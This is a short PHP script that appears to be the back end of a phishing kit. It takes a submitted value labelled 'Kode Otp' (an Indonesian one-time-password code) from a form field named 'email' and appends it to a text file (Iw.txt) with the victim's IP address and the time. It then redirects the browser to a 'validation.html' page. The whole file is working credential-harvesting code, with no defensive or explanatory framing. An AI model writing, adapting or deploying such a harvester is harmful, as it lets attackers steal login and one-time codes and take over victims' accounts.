<?php
$file = "Iw.txt";
$email = $_POST['email'];
$a22 = $_POST['a22'];
$a33 = $_POST['a33'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");
 
$handle = fopen($file, 'a');
fwrite($handle, "++++++++++++++++++++++++++++++++++++++++++++++++++++");
fwrite($handle, "\n");
fwrite($handle, "Kode Otp: ");
fwrite($handle, "$email");
fwrite($handle, "\n");
fwrite($handle, "IP Address: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Date Submitted: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "++++++++++++++++++++++++++++++++++++++++++++++++++++");
fwrite($handle, "\n");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"validation.html\";
</script>";
?>